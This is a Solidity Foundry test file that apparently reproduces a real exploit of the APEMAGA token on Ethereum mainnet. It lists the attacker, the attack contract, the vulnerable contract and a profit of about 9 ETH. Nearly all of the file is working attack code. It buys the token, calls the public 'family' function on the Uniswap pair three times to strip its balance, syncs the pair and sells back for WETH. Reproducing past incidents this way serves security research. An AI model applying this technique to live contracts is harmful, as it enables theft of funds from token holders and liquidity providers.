// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./../interface.sol";

// Profit : ~9 ETH
// TX : https://app.blocksec.com/explorer/tx/eth/0x6beb21b53f5b205c088570333ec875b720e333b49657f7026b01ed72b026851e?line=19
// Attacker : https://etherscan.io/address/0xb297735e9fb3e695ccce3963bfe042f318901ea0
// Attack Contract : https://etherscan.io/address/0x8de6314058c0b7eea809881d73e69b425c01f0b5#code
// Vulnerable Contract : https://etherscan.io/address/0x56ff4afd909aa66a1530fe69bf94c74e6d44500c
// GUY : https://x.com/ChainAegis/status/1806297556852601282

interface APEMAGA  is IERC20{
    function family(address account) external;
}

contract ContractTest is Test {
    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
    Uni_Pair_V2 Pair = Uni_Pair_V2(0x85705829c2f71EE3c40A7C28f6903e7c797c9433); 
    IUniswapV2Router uniswapv2 = IUniswapV2Router(payable(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D));
    APEMAGA Apemaga = APEMAGA(0x56FF4AfD909AA66a1530fe69BF94c74e6D44500C);
    IERC20 USDT = IERC20(0x55d398326f99059fF775485246999027B3197955);
    IERC20 WETH = IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);

    function setUp() external {
        cheats.createSelectFork("mainnet", 20175261);
        deal(address(WETH), address(this), 9 ether);
    }

    function testExploit() external {
        emit log_named_decimal_uint("[Begin] Attacker WETH before exploit", WETH.balanceOf(address(this)), 18);
        attack();
        emit log_named_decimal_uint("[End] Attacker WETH after exploit", WETH.balanceOf(address(this)), 18);
    }

    function attack() public {
      
        swap_token_to_ExactToken(0.1 ether,address(WETH),address(Apemaga),8000 ether);
        // emit log_named_decimal_uint("[End] Attacker token before exploit", Apemaga.balanceOf(address(this)), Apemaga.decimals());

        Apemaga.family(address(Pair));
        Apemaga.family(address(Pair));
        Apemaga.family(address(Pair));

        Pair.sync();

        address[] memory addrPath = new address[](2);
        addrPath[0] = address(Apemaga);
        addrPath[1] = address(WETH);
        Apemaga.approve(address(uniswapv2),99999999 ether);
        uniswapv2.swapExactTokensForTokens(Apemaga.balanceOf(address(this)), 0, addrPath, address(this), type(uint256).max);


    }
 

    function swap_token_to_ExactToken(uint256 amount,address a,address b,uint256 amountInMax) payable public {
        IERC20(a).approve(address(uniswapv2), amountInMax);
        address[] memory path = new address[](2);
        path[0] = address(a);
        path[1] = address(b);
        uniswapv2.swapExactETHForTokens{value: amount}(0, path, address(this), block.timestamp + 120);

    }
}